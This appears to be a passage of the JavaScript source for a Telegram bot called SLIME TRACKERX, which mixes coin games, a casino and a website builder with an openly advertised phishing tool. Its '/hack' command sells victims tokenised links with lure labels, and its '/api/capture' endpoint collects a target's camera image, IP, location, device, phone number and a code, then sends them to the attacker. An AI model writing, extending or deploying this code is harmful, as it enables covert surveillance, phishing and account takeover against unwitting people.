        [{ text: "💀 HACK", callback_data: "menu_hack" }, { text: "📝 WORD BATTLE", callback_data: "menu_word" }],
        [{ text: "🌐 CREATE WEBSITE", callback_data: "menu_web" }, { text: "🎰 CASINO", callback_data: "menu_casino" }],
        [{ text: "🎮 GAMES", callback_data: "menu_games" }, { text: "💰 ECONOMY", callback_data: "menu_eco" }],
        [{ text: "🏆 LEADERBOARD", callback_data: "menu_leaderboard" }, { text: "👤 PROFILE", callback_data: "menu_profile" }],
        [{ text: "🛒 SHOP", callback_data: "menu_shop" }, { text: "🎁 REDEEM", callback_data: "menu_redeem" }],
        [{ text: "🔗 REFERRAL", callback_data: "menu_ref" }, { text: "📢 CHANNEL", url: "https://t.me/devxtechzone" }],
        [{ text: "👑 ADMIN", callback_data: "menu_admin" }]
      ]
    }
  };
}

// ========== COMMANDS - ALL WORKING NOW ==========

// START command
bot.start(async (ctx) => {
  let ref = null;
  let args = ctx.message.text.split(" ");
  if (args[1] && args[1].startsWith("ref_")) { 
    ref = parseInt(args[1].replace("ref_", "")); 
  }
  let user = await initUser(ctx.from.id, ref);
  
  await ctx.reply(
    `🟢⚡ **SLIME TRACKERX v40.0** ⚡🟢\n\n` +
    `✨ Welcome ${ctx.from.first_name}!\n` +
    `💰 ${user.coins} coins | 💎 ${user.diamonds}\n` +
    `📊 Level ${user.level} | 👥 ${user.referrals} referrals\n` +
    `🏆 Word Wins: ${user.wordWins}\n\n` +
    `⬇️ **CLICK BUTTONS BELOW** ⬇️`,
    { parse_mode: "Markdown", ...getMainMenu() }
  );
});

// HACK command
bot.command("hack", async (ctx) => {
  let args = ctx.message.text.split(" ");
  
  if (args.length < 2) {
    return ctx.reply(
      `💀 **PHISHING LINK GENERATOR** 💀\n\n` +
      `Usage: /hack [label]\n\n` +
      `Examples:\n` +
      `/hack free gift\n` +
      `/hack win iphone\n` +
      `/hack claim reward\n\n` +
      `💰 Cost: ${TRACK_COST} coins\n` +
      `📸 Captures Camera + IP + Location\n\n` +
      `The target will see VirtualNumbers - looks legit!`
    );
  }
  
  let user = await initUser(ctx.from.id);
  if (user.coins < TRACK_COST) {
    return ctx.reply(`❌ You need ${TRACK_COST} coins! You have ${user.coins}\n\nEarn coins: /daily, /work, or play games!`);
  }
  
  await takeCoin(ctx.from.id, TRACK_COST);
  user.hacks = (user.hacks || 0) + 1;
  await saveUser(ctx.from.id, user);
  
  let token = crypto.randomBytes(16).toString("hex");
  let label = args.slice(1).join(" ");
  
  hackTokens.set(token, { 
    userId: ctx.from.id,
    username: ctx.from.username || ctx.from.first_name,
    label: label,
    time: Date.now()
  });
  
  let hackLink = `${DOMAIN}/?token=${token}`;
  
  await ctx.reply(
    `💀 **PHISHING LINK READY** 💀\n\n` +
    `🎯 Label: ${label}\n` +
    `💰 Cost: -${TRACK_COST} coins\n` +
    `💀 Total Hacks: ${user.hacks}\n\n` +
    `🔗 **YOUR LINK:**\n\`${hackLink}\`\n\n` +
    `Send this link to your target!\n` +
    `When they click, you'll get Camera + IP + Location!`,
    { parse_mode: "Markdown" }
  );
});

// WORD BATTLE command
bot.command("wordbattle", async (ctx) => {
  let args = ctx.message.text.split(" ");
  if (args.length < 4) {
    return ctx.reply(`📝 **WORD CHALLENGE**\n\nUsage: /wordbattle @username amount difficulty\n\nDifficulties:\n🍃 easy - 3 letters\n⚡ medium - 5 letters\n🔥 hard - 7 letters\n💀 expert - 9 letters\n\n💰 Min bet: ${WORD_MIN_BET}`);
  }
  
  let targetUsername = args[1];
  let betAmount = parseInt(args[2]);
  let difficulty = args[3].toLowerCase();
  
  if (!difficulties[difficulty]) return ctx.reply("❌ Invalid difficulty!");
  if (isNaN(betAmount) || betAmount < WORD_MIN_BET) return ctx.reply(`❌ Min bet ${WORD_MIN_BET}!`);
  if (betAmount > WORD_MAX_BET) return ctx.reply(`❌ Max bet ${WORD_MAX_BET}!`);
  
  let targetId = null;
  for (let [id] of usersCache) {
    try {
      let c = await ctx.telegram.getChat(id);
      if (c.username === targetUsername.replace("@", "")) { targetId = id; break; }
    } catch(e) {}
  }
  if (!targetId) return ctx.reply("❌ User not found!");
  if (targetId === ctx.from.id) return ctx.reply("❌ Cannot battle yourself!");
  
  let user = await initUser(ctx.from.id);
  if (user.coins < betAmount) return ctx.reply(`❌ You need ${betAmount} coins!`);
  
  let diff = difficulties[difficulty];
  
  wordChallenges.set(targetId, { 
    from: ctx.from.id, 
    bet: betAmount, 
    difficulty, 
    letterCount: diff.letters, 
    status: "waiting",
    timer: diff.timer
  });
  setTimeout(() => { if (wordChallenges.get(targetId)?.status === "waiting") wordChallenges.delete(targetId); }, 60000);
  
  await ctx.reply(`✅ Challenge sent to ${targetUsername}!\n💰 Bet: ${betAmount} coins\n${diff.name}\n📏 Need a ${diff.letters}-letter word\n⏱️ ${diff.timer} seconds`);
  await ctx.telegram.sendMessage(targetId, `📝 **WORD CHALLENGE!**\n\n@${ctx.from.username} challenges you!\n💰 Bet: ${betAmount} coins\n📏 Need a **${diff.letters}-letter word**\n⏱️ ${diff.timer} seconds\n\nType /acceptword to accept!`);
});

// ACCEPT WORD command
bot.command("acceptword", async (ctx) => {
  let challenge = wordChallenges.get(ctx.from.id);
  if (!challenge) return ctx.reply("❌ No challenge found!");
  if (challenge.status !== "waiting") return ctx.reply("❌ Already accepted!");
  
  let accepter = await initUser(ctx.from.id);
  if (accepter.coins < challenge.bet) return ctx.reply(`❌ Need ${challenge.bet} coins!`);
  
  await takeCoin(challenge.from, challenge.bet);
  await takeCoin(ctx.from.id, challenge.bet);
  
  let diff = difficulties[challenge.difficulty];
  challenge.status = "active";
  challenge.currentTurn = "challenger";
  wordChallenges.set(ctx.from.id, challenge);
  
  await ctx.telegram.sendMessage(challenge.from, `📝 **YOUR TURN!**\n\nGive a **${challenge.letterCount}-letter word**\n⏱️ ${diff.timer} seconds!\n💰 Pot: ${challenge.bet * 2} coins`);
  
  setTimeout(async () => {
    let game = wordChallenges.get(ctx.from.id);
    if (game && game.status === "active" && game.currentTurn === "challenger") {
      game.status = "completed";
      wordChallenges.delete(ctx.from.id);
      await addCoin(ctx.from.id, challenge.bet * 2);
      await addXP(ctx.from.id, 10);
      await ctx.telegram.sendMessage(ctx.from.id, `🎉 **YOU WIN!**\n💰 Won ${challenge.bet * 2} coins! +10 XP`);
      await ctx.telegram.sendMessage(challenge.from, `💀 **YOU LOSE!**\n💸 Lost ${challenge.bet} coins`);
    }
  }, diff.timer * 1000);
  
  await ctx.reply(`✅ Accepted! Challenger's turn!\n⏱️ ${diff.timer} seconds!`);
});

// LEADERBOARD command
bot.command("leaderboard", async (ctx) => {
  let sorted = Array.from(usersCache.values()).sort((a, b) => b.coins - a.coins).slice(0, 15);
  let message = "🏆 **TOP 15 COINS** 🏆\n\n";
  for (let i = 0; i < sorted.length; i++) {
    let name = await getUsername(sorted[i].userId);
    let medal = i === 0 ? "👑" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    message += `${medal} ${i+1}. @${name} - ${sorted[i].coins} coins (Lvl ${sorted[i].level})\n`;
  }
  await ctx.reply(message);
});

// TOP WORDS command
bot.command("topwords", async (ctx) => {
  let sorted = Array.from(usersCache.values()).sort((a, b) => b.wordWins - a.wordWins).slice(0, 10);
  let message = "📝 **TOP WORD BATTLE WINNERS** 📝\n\n";
  for (let i = 0; i < sorted.length; i++) {
    let name = await getUsername(sorted[i].userId);
    message += `${i+1}. @${name} - ${sorted[i].wordWins} wins\n`;
  }
  await ctx.reply(message);
});

// BALANCE command
bot.command("balance", async (ctx) => { 
  let u = await initUser(ctx.from.id); 
  await ctx.reply(`💰 **BALANCE**\n\nCoins: ${u.coins}\n💎 Diamonds: ${u.diamonds}\n📊 Level: ${u.level}\n⭐ XP: ${u.xp}/${u.level * 100}`);
});

// PROFILE command
bot.command("profile", async (ctx) => { 
  let u = await initUser(ctx.from.id); 
  await ctx.reply(`👤 **${ctx.from.first_name}**\n\n💰 ${u.coins} coins\n💎 ${u.diamonds}\n📊 Level ${u.level}\n👥 ${u.referrals} referrals\n💀 ${u.hacks} hacks\n🎮 ${u.wins}W/${u.losses}L\n📝 Word Wins: ${u.wordWins}\n🌐 ${u.websites.length} websites\n🏆 Badges: ${u.badges.join(", ")}`); 
});

// DAILY command
bot.command("daily", async (ctx) => { 
  let u = await initUser(ctx.from.id); 
  let now = Date.now(); 
  if (u.lastDaily && now - u.lastDaily < 86400000) { 
    let h = Math.floor((86400000 - (now - u.lastDaily)) / 3600000); 
    let m = Math.floor(((86400000 - (now - u.lastDaily)) % 3600000) / 60000);
    return ctx.reply(`⏰ ${h}h ${m}m left until next daily!`); 
  } 
  
  let streakBonus = u.streak * 1;
  let reward = DAILY_REWARD + streakBonus;
  await addCoin(ctx.from.id, reward);
  u.lastDaily = new Date(now);
  u.streak = (u.streak % 7) + 1;
  await saveUser(ctx.from.id, u);
  await ctx.reply(`🎁 **DAILY REWARD!**\n+${reward} coins\n🔥 Streak: ${u.streak}/7 days`); 
});

// WORK command
bot.command("work", async (ctx) => { 
  let u = await initUser(ctx.from.id); 
  let now = Date.now(); 
  let last = workCD.get(u.userId) || 0; 
  if (now - last < 12 * 60 * 60 * 1000) { 
    let h = Math.floor((12 * 60 * 60 * 1000 - (now - last)) / 3600000); 
    return ctx.reply(`⏰ ${h}h left until you can work again!`); 
  } 
  let jobs = ["💻 Developer", "🎨 Designer", "📝 Writer", "🎮 Tester", "📊 Analyst", "🔧 Engineer", "🚀 Marketer", "📈 Trader"]; 
  let job = jobs[Math.floor(Math.random() * jobs.length)]; 
  await addCoin(u.userId, WORK_REWARD);
  workCD.set(u.userId, now); 
  await ctx.reply(`💼 Worked as ${job}!\n+${WORK_REWARD} coins`); 
});

// REDEEM command
bot.command("redeem", async (ctx) => { 
  let args = ctx.message.text.split(" "); 
  if (args.length < 2) return ctx.reply("❌ Usage: /redeem CODE"); 
  let res = await redeemCode(ctx.from.id, args[1]); 
  await ctx.reply(res.msg); 
});

// DICE command
bot.command("dice", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let bet = parseInt(args[1]);
  let u = await initUser(ctx.from.id);
  if (isNaN(bet) || bet < 1) return ctx.reply("❌ Usage: /dice amount (min 1 coin)");
  if (u.coins < bet) return ctx.reply(`❌ Need ${bet} coins`);
  
  await takeCoin(ctx.from.id, bet);
  let roll = Math.floor(Math.random() * 6) + 1;
  
  if (roll === 6) {
    let winAmount = bet * 3;
    await addCoin(ctx.from.id, winAmount);
    await addXP(ctx.from.id, 5);
    await ctx.replyWithDice();
    await ctx.reply(`🎲 Rolled ${roll}! 🎉 **JACKPOT!** +${winAmount} coins! +5 XP`);
  } else if (roll >= 4) {
    let winAmount = bet;
    await addCoin(ctx.from.id, winAmount);
    await addXP(ctx.from.id, 2);
    await ctx.replyWithDice();
    await ctx.reply(`🎲 Rolled ${roll}! 🎉 WIN +${winAmount} coins! +2 XP`);
  } else {
    await ctx.replyWithDice();
    await ctx.reply(`🎲 Rolled ${roll}! 💀 LOSE -${bet} coins`);
  }
});

// SLOTS command
bot.command("slots", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let bet = parseInt(args[1]);
  let u = await initUser(ctx.from.id);
  if (isNaN(bet) || bet < 5) return ctx.reply("❌ Usage: /slots amount (min 5 coins)");
  if (u.coins < bet) return ctx.reply(`❌ Need ${bet} coins`);
  
  await takeCoin(ctx.from.id, bet);
  let slots = ["🍒", "🍊", "🍋", "🍉", "⭐", "💎", "7️⃣", "🎰"];
  let result = [slots[Math.floor(Math.random()*slots.length)], slots[Math.floor(Math.random()*slots.length)], slots[Math.floor(Math.random()*slots.length)]];
  
  if (result[0] === result[1] && result[1] === result[2]) {
    let winAmount = bet * 10;
    await addCoin(ctx.from.id, winAmount);
    await addXP(ctx.from.id, 20);
    await ctx.reply(`🎰 ${result.join(" ")} 🎰\n🎉 **MEGA JACKPOT!** +${winAmount} coins! +20 XP 🎉`);
  } else if (result[0] === result[1] || result[1] === result[2] || result[0] === result[2]) {
    let winAmount = bet * 2;
    await addCoin(ctx.from.id, winAmount);
    await addXP(ctx.from.id, 5);
    await ctx.reply(`🎰 ${result.join(" ")} 🎰\n🎉 WIN +${winAmount} coins! +5 XP`);
  } else {
    await ctx.reply(`🎰 ${result.join(" ")} 🎰\n💀 LOSE -${bet} coins`);
  }
});

// SHOP command
bot.command("shop", async (ctx) => {
  await ctx.reply(`🛒 **SHOP** 🛒\n\n💎 100 Diamonds - 50 coins\n🎫 Lottery Ticket - 5 coins\n🎁 Mystery Box - 20 coins\n\nUse /buy [item]`);
});

// BUY command
bot.command("buy", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let item = args[1]?.toLowerCase();
  let u = await initUser(ctx.from.id);
  
  if (item === "diamonds") {
    if (u.coins < 50) return ctx.reply("❌ Need 50 coins!");
    await takeCoin(ctx.from.id, 50);
    u.diamonds += 100;
    await saveUser(ctx.from.id, u);
    await ctx.reply(`✅ +100 diamonds!`);
  } else if (item === "ticket") {
    if (u.coins < 5) return ctx.reply("❌ Need 5 coins!");
    await takeCoin(ctx.from.id, 5);
    await ctx.reply(`✅ Bought lottery ticket! Use /lottery to play`);
  } else if (item === "mystery") {
    if (u.coins < 20) return ctx.reply("❌ Need 20 coins!");
    await takeCoin(ctx.from.id, 20);
    let rewards = [10, 20, 30, 50, 100, 200, 500];
    let reward = rewards[Math.floor(Math.random() * rewards.length)];
    await addCoin(ctx.from.id, reward);
    await addXP(ctx.from.id, 10);
    await ctx.reply(`🎁 **Mystery Box**\nYou got ${reward} coins! +10 XP 🎉`);
  } else {
    await ctx.reply("❌ Items: diamonds, ticket, mystery");
  }
});

// WEB command
bot.command("web", async (ctx) => {
  await ctx.reply(`🌐 **DOPE WEB CREATOR** 🌐\n\n💰 Cost: ${WEB_PRICE} coins\n✨ Get LIVE LINK on Netlify!\n\n**Templates:** portfolio, business, store\n\n**How to use:** /createweb portfolio`);
});

// CREATEWEB command
bot.command("createweb", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let template = args[1];
  let u = await initUser(ctx.from.id);
  
  const templates = ["portfolio", "business", "store"];
  const questions = {
    portfolio: ["name", "title", "bio", "email", "skill1", "skill2", "skill3"],
    business: ["company", "tagline", "service1", "service1_desc", "service2", "service2_desc", "service3", "service3_desc", "email", "phone", "address"],
    store: ["store", "tagline", "product1", "product1_price", "product2", "product2_price", "product3", "product3_price", "email"]
  };
  
  if (!template || !templates.includes(template)) {
    return ctx.reply(`❌ Templates: portfolio, business, store\n\nExample: /createweb portfolio`);
  }
  
  if (u.coins < WEB_PRICE) {
    return ctx.reply(`❌ You need ${WEB_PRICE} coins! You have ${u.coins}`);
  }
  
  await takeCoin(ctx.from.id, WEB_PRICE);
  webBuilds.set(ctx.from.id, { 
    template, 
    step: 0, 
    data: {}, 
    questions: questions[template]
  });
  
  await ctx.reply(`✅ Selected: ${template}\n💰 -${WEB_PRICE} coins\n\n📝 **Step 1/${questions[template].length}**\nSend: ${questions[template][0]}`);
});

// MYWEBSITES command
bot.command("mywebsites", async (ctx) => {
  let websites = await Website.find({ ownerId: ctx.from.id });
  if (websites.length === 0) {
    return ctx.reply("📭 **No websites yet!**\n\nCreate one: /createweb portfolio");
  }
  
  let message = "🌐 **YOUR WEBSITES** 🌐\n\n";
  for (let site of websites) {
    message += `📌 ${site.name}\n🔗 ${site.url}\n👁️ ${site.views} views\n\n`;
  }
  await ctx.reply(message);
});

// MYID command
bot.command("myid", async (ctx) => {
  await ctx.reply(`🔑 Your ID: \`${ctx.from.id}\``, { parse_mode: "Markdown" });
});

// ========== ADMIN COMMANDS ==========
function isOwner(userId) {
  return userId === OWNER_ID;
}

bot.command("admin", async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Owner only!");
  
  await ctx.reply(`👑 **OWNER PANEL** 👑

/addcoin @user amount
/gencode coins diamonds uses hours
/broadcast message
/users
/stats
/banuser @user
/unban @user
/giveall amount
/setadmin @user`);
});

bot.command("addcoin", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  
  let args = ctx.message.text.split(" ");
  let user = args[1]?.replace("@", "");
  let amt = parseInt(args[2]);
  
  if (!user || isNaN(amt)) return ctx.reply("Usage: /addcoin @username amount");
  
  for (let [id, u] of usersCache) {
    try { 
      let c = await ctx.telegram.getChat(id); 
      if (c.username === user) { 
        u.coins += amt;
        await saveUser(id, u);
        await ctx.reply(`✅ +${amt} coins to @${user}\n💰 New balance: ${u.coins}`); 
        await bot.telegram.sendMessage(id, `👑 Owner gave you +${amt} coins!`);
        return; 
      } 
    } catch(e) {}
  }
  ctx.reply("❌ User not found");
});

bot.command("gencode", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  
  let args = ctx.message.text.split(" ");
  let coins = parseInt(args[1]) || 50;
  let diamonds = parseInt(args[2]) || 0;
  let uses = parseInt(args[3]) || 20;
  let hours = parseInt(args[4]) || 24;
  
  let code = await genCode(coins, diamonds, uses, hours);
  await ctx.reply(`✅ **CODE GENERATED**\n\n\`${code}\`\n💰 ${coins} coins\n💎 ${diamonds} diamonds\n🎫 ${uses} uses\n⏰ ${hours} hours\n\nUse: /redeem ${code}`);
});

bot.command("broadcast", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  
  let msg = ctx.message.text.split(" ").slice(1).join(" ");
  if (!msg) return ctx.reply("Usage: /broadcast message");
  
  let sent = 0, failed = 0;
  for (let [id] of usersCache) {
    try { 
      await ctx.telegram.sendMessage(id, `📢 **ANNOUNCEMENT**\n\n${msg}`); 
      sent++; 
    } catch(e) { failed++; }
    await new Promise(r => setTimeout(r, 100));
  }
  await ctx.reply(`✅ Sent to ${sent} users\n❌ Failed: ${failed}`);
});

bot.command("users", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  await ctx.reply(`👥 Total Users: ${usersCache.size}`);
});

bot.command("stats", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  
  let totalCoins = 0;
  for (let u of usersCache.values()) totalCoins += u.coins;
  let totalWebsites = await Website.countDocuments();
  
  await ctx.reply(`📊 **STATISTICS**\n\n👥 Users: ${usersCache.size}\n💰 Total Coins: ${totalCoins}\n🌐 Websites: ${totalWebsites}`);
});

bot.command("banuser", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  
  let args = ctx.message.text.split(" ");
  let user = args[1]?.replace("@", "");
  if (!user) return ctx.reply("Usage: /banuser @username");
  
  for (let [id] of usersCache) {
    try { 
      let c = await ctx.telegram.getChat(id); 
      if (c.username === user) { 
        bannedUsers.add(id); 
        await ctx.reply(`🚫 Banned @${user}`);
        await bot.telegram.sendMessage(id, "🚫 You have been banned!");
        return; 
      } 
    } catch(e) {}
  }
  ctx.reply("❌ User not found");
});

bot.command("unban", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  
  let args = ctx.message.text.split(" ");
  let user = args[1]?.replace("@", "");
  if (!user) return ctx.reply("Usage: /unban @username");
  
  for (let [id] of usersCache) {
    try { 
      let c = await ctx.telegram.getChat(id); 
      if (c.username === user) { 
        bannedUsers.delete(id); 
        await ctx.reply(`✅ Unbanned @${user}`);
        await bot.telegram.sendMessage(id, "✅ You have been unbanned!");
        return; 
      } 
    } catch(e) {}
  }
  ctx.reply("❌ User not found");
});

bot.command("giveall", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  
  let args = ctx.message.text.split(" ");
  let amount = parseInt(args[1]);
  if (isNaN(amount)) return ctx.reply("Usage: /giveall amount");
  
  let count = 0;
  for (let [id, u] of usersCache) { 
    u.coins += amount; 
    await saveUser(id, u); 
    count++;
  }
  await ctx.reply(`✅ Added ${amount} coins to ${count} users`);
});

bot.command("setadmin", async (ctx) => {
  if (!isOwner(ctx.from.id)) return;
  
  let args = ctx.message.text.split(" ");
  let user = args[1]?.replace("@", "");
  if (!user) return ctx.reply("Usage: /setadmin @username");
  
  for (let [id, u] of usersCache) {
    try { 
      let c = await ctx.telegram.getChat(id); 
      if (c.username === user) { 
        u.isAdmin = true;
        await saveUser(id, u);
        await ctx.reply(`✅ @${user} is now admin!`);
        await bot.telegram.sendMessage(id, "👑 You are now an admin!");
        return; 
      } 
    } catch(e) {}
  }
  ctx.reply("❌ User not found");
});

// ========== BUTTON HANDLERS ==========
bot.action("menu_hack", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(`💀 **HACK**\n\n/hack [label]\n💰 Cost: ${TRACK_COST} coins\n📸 Captures Camera + IP + Location`);
});

bot.action("menu_word", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(`📝 **WORD BATTLE**\n\n/wordbattle @user amount difficulty`);
});

bot.action("menu_web", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(
    `🌐 **DOPE WEB CREATOR** 🌐\n\n` +
    `💰 **Cost:** ${WEB_PRICE} coins\n\n` +
    `⚡ **Auto-Deploy to Netlify!**\n` +
    `Get an INSTANT LIVE LINK when you're done!\n\n` +
    `📌 **Templates Available:**\n` +
    `• portfolio - Personal portfolio website\n` +
    `• business - Company/Business website  \n` +
    `• store - E-commerce store website\n\n` +
    `📝 **How to use:**\n` +
    `1. Type /createweb [template]\n` +
    `2. Answer the questions (name, bio, email, etc.)\n` +
    `3. **BOOM!** 🎉 Auto-deployed to Netlify\n` +
    `4. Get your LIVE LINK instantly!\n\n` +
    `📋 **Examples:**\n` +
    `• /createweb portfolio\n` +
    `• /createweb business\n` +
    `• /createweb store\n\n` +
    `🔗 **Your website will be live at:**\n` +
    `https://your-site-name.netlify.app\n\n` +
    `💡 **Pro tip:** Share your live link anywhere!\n` +
    `The website works on mobile + desktop!\n\n` +
    `✨ **Try it now:** /createweb portfolio`
  );
});

bot.action("menu_casino", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(`🎰 **CASINO**\n\n/dice amount\n/slots amount`);
});

bot.action("menu_games", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(`🎮 **GAMES**\n\n/dice amount\n/slots amount\n/wordbattle`);
});

bot.action("menu_eco", async (ctx) => {
  await ctx.answerCbQuery();
  let u = await initUser(ctx.from.id);
  await ctx.reply(`💰 **ECONOMY**\n\nBalance: ${u.coins} coins\n/daily\n/work`);
});

bot.action("menu_leaderboard", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(`🏆 **LEADERBOARDS**\n\n/leaderboard\n/topwords`);
});

bot.action("menu_profile", async (ctx) => {
  await ctx.answerCbQuery();
  let u = await initUser(ctx.from.id);
  await ctx.reply(`👤 **PROFILE**\n\nCoins: ${u.coins}\nLevel: ${u.level}\nHacks: ${u.hacks}\nWord Wins: ${u.wordWins}`);
});

bot.action("menu_shop", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(`🛒 **SHOP**\n\n/buy diamonds\n/buy ticket\n/buy mystery`);
});

bot.action("menu_redeem", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(`🎁 **REDEEM**\n\n/redeem CODE`);
});

bot.action("menu_ref", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(`🔗 **REFERRAL**\n\n${refLink(ctx.from.id)}\n\n+${REF_REWARD} coins per referral!`);
});

bot.action("menu_admin", async (ctx) => {
  let user = await initUser(ctx.from.id);
  if (!user.isAdmin && ctx.from.id !== OWNER_ID) {
    await ctx.answerCbQuery("❌ Admin only!");
    return;
  }
  await ctx.answerCbQuery();
  await ctx.reply(`👑 **ADMIN**\n\n/addcoin\n/gencode\n/broadcast\n/users\n/stats\n/banuser\n/unban\n/giveall\n/setadmin`);
});

bot.action("menu_mywebsites", async (ctx) => {
  await ctx.answerCbQuery();
  let websites = await Website.find({ ownerId: ctx.from.id });
  if (websites.length === 0) {
    await ctx.reply("No websites yet! /createweb portfolio");
  } else {
    let msg = "🌐 **YOUR WEBSITES**\n\n";
    for (let site of websites) {
      msg += `• ${site.name}\n  ${site.url}\n\n`;
    }
    await ctx.reply(msg);
  }
});

// ========== TEXT HANDLER (FIXED - doesn't block commands) ==========
bot.on("text", async (ctx) => {
  // CRITICAL FIX: Skip if it's a command
  if (ctx.message.text.startsWith("/")) {
    return; // Let command handlers process it
  }
  
  const msgId = `${ctx.chat.id}_${ctx.message.message_id}`;
  if (processedMessages.has(msgId)) return;
  processedMessages.add(msgId);
  setTimeout(() => processedMessages.delete(msgId), 5000);
  
  // Handle web creation
  let build = webBuilds.get(ctx.from.id);
  if (build) {
    if (build.step < build.questions.length) {
      build.data[build.questions[build.step]] = ctx.message.text;
      build.step++;
      
      if (build.step < build.questions.length) {
        await ctx.reply(`📝 Step ${build.step + 1}/${build.questions.length}\nSend: ${build.questions[build.step]}`);
      } else {
        await ctx.reply("⏳ Creating your website...");
        
        let html = htmlTemplates[build.template](build.data);
        let siteName = build.data[build.questions[0]] || "mywebsite";
        let result = await deployToNetlify(html, siteName);
        
        if (result.success) {
          let website = new Website({
            name: siteName,
            ownerId: ctx.from.id,
            template: build.template,
            content: build.data,
            url: result.url,
            netlifyId: result.siteName
          });
          await website.save();
          
          let user = usersCache.get(ctx.from.id);
          user.websites.push({ name: siteName, url: result.url });
          await saveUser(ctx.from.id, user);
          
          await ctx.reply(`✅ **WEBSITE CREATED!**\n\n🌐 ${result.url}\n\nShare it with anyone!`);
        } else {
          await ctx.reply(`❌ Failed: ${result.error}\nCoins refunded.`);
          await addCoin(ctx.from.id, WEB_PRICE);
        }
        webBuilds.delete(ctx.from.id);
      }
    }
    return;
  }
  
  // Handle word challenge response
  for (let [challengedId, challenge] of wordChallenges) {
    if (challenge.status === "active" && challenge.currentTurn === "challenger" && ctx.from.id === challenge.from) {
      let answer = ctx.message.text.toUpperCase().trim();
      if (answer.length === challenge.letterCount) {
        challenge.status = "completed";
        wordChallenges.delete(challengedId);
        let totalPot = challenge.bet * 2;
        await addCoin(challenge.from, totalPot);
        await addXP(challenge.from, 10);
        await ctx.reply(`🎉 CORRECT! Won ${totalPot} coins! +10 XP`);
        await ctx.telegram.sendMessage(challengedId, `💀 You lost! Lost ${challenge.bet} coins`);
      } else {
        challenge.status = "completed";
        wordChallenges.delete(challengedId);
        await addCoin(challengedId, challenge.bet * 2);
        await addXP(challengedId, 10);
        await ctx.reply(`❌ WRONG! Needed ${challenge.letterCount} letters! Lost ${challenge.bet} coins`);
        await ctx.telegram.sendMessage(challengedId, `🎉 You win! Won ${challenge.bet * 2} coins! +10 XP`);
      }
      return;
    }
  }
  
  await addXP(ctx.from.id, 1);
});

// ========== MIDDLEWARE ==========
bot.use(async (ctx, next) => {
  if (!ctx.from) return next();
  if (bannedUsers.has(ctx.from.id)) return ctx.reply("🚫 You are banned!");
  
  let user = usersCache.get(ctx.from.id);
  if (user) {
    user.lastActive = new Date();
    await saveUser(ctx.from.id, user);
  }
  
  let joined = await checkJoin(ctx);
  if (!joined && ctx.from.id !== OWNER_ID) {
    return ctx.reply(`🚫 **JOIN CHANNEL**\n\nJoin @devxtechzone to use this bot!`, {
      reply_markup: {
        inline_keyboard: [[{ text: "📢 JOIN", url: "https://t.me/devxtechzone" }]]
      }
    });
  }
  return next();
});

// ========== API ENDPOINTS ==========
app.post("/api/capture", async (req, res) => {
  try {
    let { image, token, ip, location, number, country, code, userAgent, screenSize } = req.body;
    
    if (!token) return res.status(400).json({ error: "No token" });
    
    let data = hackTokens.get(token);
    
    if (data) {
      let message = 
        `💀 **PHISHING SUCCESSFUL** 💀\n\n` +
        `🎯 Label: ${data.label || "No label"}\n` +
        `👤 Hacker: @${data.username}\n` +
        `🕐 Time: ${new Date().toLocaleString()}\n\n` +
        `📱 IP: ${ip || "Unknown"}\n` +
        `📍 Location: ${location || "Unknown"}\n` +
        `🌐 Device: ${(userAgent || "Unknown").substring(0, 100)}\n` +
        `📞 Number: ${number || "Unknown"}\n` +
        `🔢 Code: ${code || "Unknown"}\n\n` +
        `✨ +15 XP EARNED!`;
      
      if (image) {
        await bot.telegram.sendPhoto(data.userId, { source: Buffer.from(image.split(',')[1], 'base64') }, { caption: message });
      } else {
        await bot.telegram.sendMessage(data.userId, message);
      }
      
      await addXP(data.userId, 15);
      hackTokens.delete(token);
    }
    
    res.json({ status: "success" });
  } catch(e) {
    console.error("Capture error:", e);
    res.status(500).json({ error: "Internal error" });
  }
});

app.post("/api/upload", upload.single("image"), async (req, res) => {
  if (!req.file) return res.status(400).json({ error: "No file" });
  res.json({ url: `${DOMAIN}/uploads/${req.file.filename}` });
});

app.get("/", (req, res) => { 
  res.sendFile(path.join(__dirname, "public", "index.html")); 
});

// ========== START SERVER ==========
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server on ${PORT}`));

loadData().then(async () => {
  try {
    await bot.telegram.deleteWebhook();
    await bot.launch({ dropPendingUpdates: true });
    console.log(`🤖 SLIME TRACKERX v40.0 LIVE!`);
    console.log(`✅ All commands working!`);
    console.log(`✅ Hack system ready!`);
  } catch(e) {
    console.log("Error:", e.message);
  }
});

process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
